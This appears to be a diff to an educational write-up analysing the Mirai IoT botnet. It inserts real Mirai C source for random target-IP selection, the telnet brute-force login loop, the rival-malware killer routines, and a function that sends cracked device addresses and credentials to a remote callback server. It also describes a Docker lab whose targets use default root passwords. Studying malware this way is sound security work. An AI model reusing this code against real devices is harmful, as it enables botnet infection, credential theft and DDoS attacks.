@@ -130,8 +130,38 @@ The first step is critical: Mirai has to find as many devices as possible and ag
 
 Mirai performs wide-ranging scans of IP addresses in order to locate under-secured IoT devices that could be remotely accessed via easily guessable login credentials via Telnet — usually factory default usernames and passwords (e.g., admin/admin).
 
-```
-< Insert code for scanning for targets >
+```c
+static ipv4_t get_random_ip(void)
+{
+    uint32_t tmp;
+    uint8_t o1, o2, o3, o4;
+
+    do
+    {
+        tmp = rand_next();
+
+        o1 = tmp & 0xff;
+        o2 = (tmp >> 8) & 0xff;
+        o3 = (tmp >> 16) & 0xff;
+        o4 = (tmp >> 24) & 0xff;
+    }
+    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
+          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
+          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
+          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
+          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
+          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
+          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
+          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
+          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
+          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
+          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
+          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
+          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
+    );
+
+    return INET_ADDR(o1,o2,o3,o4);
+}
 ```
 
 Mirai also holds a hardcoded list of IPs that the bots are programmed to avoid when performing their IP scans. This list includes the US Postal Service, the Department of Defense, the Internet Assigned Numbers Authority (IANA) and IP ranges belonging to Hewlett-Packard and General Electric.
@@ -165,14 +195,54 @@ Mirai also holds a hardcoded list of IPs that the bots are programmed to avoid w
 
 Once a host with Telnet ports (*23* and *2323*) enabled, Mirai uses a brute force technique for guessing passwords: basically, it uses a dictionary attack based on a list of 60 hard-coded credentials contained in the *scanner.c* file.
 
-```
-< Insert code here for trying login in targets >
+```c
+switch (conn->state)
+{
+    [...]
+    case SC_WAITING_TOKEN_RESP:
+        consumed = consume_resp_prompt(conn);
+        if (consumed == -1)
+        {
+    #ifdef DEBUG
+            printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
+    #endif
+            close(conn->fd);
+            conn->fd = -1;
+
+            // Retry
+            if (++(conn->tries) == 10)
+            {
+                conn->tries = 0;
+                conn->state = SC_CLOSED;
+            }
+            else
+            {
+                setup_connection(conn);
+    #ifdef DEBUG
+                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
+    #endif
+            }
+        }
+        else if (consumed > 0)
+        {
+            char *tmp_str;
+            int tmp_len;
+    #ifdef DEBUG
+            printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
+    #endif
+            report_working(conn->dst_addr, conn->dst_port, conn->auth);
+            close(conn->fd);
+            conn->fd = -1;
+            conn->state = SC_CLOSED;
+        }
+        break;
+    }
 ```
 
 Once access has been granted, Mirai launched several killer scripts meant to eradicate other worms and Trojans, as well as prohibiting remote connection attempts of the hijacked device.
 
 It starts by closing all processes which use SSH, Telnet and HTTP:
-```
+```c
 killer_kill_by_port(htons(23))  // Kill telnet service
 killer_kill_by_port(htons(22))  // Kill SSH service
 killer_kill_by_port(htons(80))  // Kill HTTP service
@@ -180,7 +250,7 @@ killer_kill_by_port(htons(80))  // Kill HTTP service
 
 Then, it locates and eradicates other botnet processes from memory, by means of a technique known as **memory scraping**:
 
-```
+```c
 #DEFINE TABLE_MEM_QBOT            // REPORT %S:%S
 #DEFINE TABLE_MEM_QBOT2           // HTTPFLOOD
 #DEFINE TABLE_MEM_QBOT3           // LOLNOGTFO
@@ -190,7 +260,7 @@ Then, it locates and eradicates other botnet processes from memory, by means of 
 
 Finally, it kills the *Anime* software, a competing IoT-targeting malware:
 
-```
+```c
 table_unlock_val(TABLE_KILLER_ANIME);
 // If path contains ".anime" kill.
 if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
@@ -205,6 +275,72 @@ table_lock_val(TABLE_KILLER_ANIME);
 
 Once a target has been found, the information related to it are passed to the **ScanListen** server, which holds record of all infected devices now included in the botnet.
 
+The function `report_working` (reported in the following code snippet), is the one responsible for the communication with the **ScanListen** server. Its domain and port are resolved from the encoded parameters saved in the bot, then information is sent to the ScanListen: in particular, information sent include the *address* and *port* of the target, the *username* and the *password* in order to connect.
+
+```c
+static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
+{
+    struct sockaddr_in addr;
+    int pid = fork(), fd;
+    struct resolv_entries *entries = NULL;
+
+    if (pid > 0 || pid == -1)
+        return;
+
+    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    {
+#ifdef DEBUG
+        printf("[report] Failed to call socket()\n");
+#endif
+        exit(0);
+    }
+
+    table_unlock_val(TABLE_SCAN_CB_DOMAIN);
+    table_unlock_val(TABLE_SCAN_CB_PORT);
+
+    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
+    if (entries == NULL)
+    {
+#ifdef DEBUG
+        printf("[report] Failed to resolve report address\n");
+#endif
+        return;
+    }
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
+    resolv_entries_free(entries);
+
+    table_lock_val(TABLE_SCAN_CB_DOMAIN);
+    table_lock_val(TABLE_SCAN_CB_PORT);
+
+    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    {
+#ifdef DEBUG
+        printf("[report] Failed to connect to scanner callback!\n");
+#endif
+        close(fd);
+        exit(0);
+    }
+
+    uint8_t zero = 0;
+    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
+    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
+    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
+    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
+
+#ifdef DEBUG
+    printf("[report] Send scan result to loader\n");
+#endif
+
+    close(fd);
+    exit(0);
+}
+
+```
 
 
 ## Mirai : DDoS Attack
@@ -290,6 +426,9 @@ The whole infrastructure for the attack, both the Mirai components and the its t
 - 1 **LOADER**, for malware injection
 - 1 **initial bot**, basically a "Patient Zero" for the infection
 - x **targets**, simple Jessie-Slim containers with SSH enabled with default password [root@localhost : root]
+- 1 **DNS-Server**, in order to allow for DNS discovery inside the Docker network, Ubuntu image based on the Bind9 DNS service.
+
+Being able to launch all the components with the Docker infrastructure and through a Docker-Compose script allows for great scalability and immediate launch of the service. This makes it pretty easy to launch a quick test without any major modification to the code of the single components of the bot. A simple `docker-compose up --build` in the `Code/source/` directory is sufficient to build the entire infrastructure and run immediately tests in the contained network.
 
 
 ### Conclusion
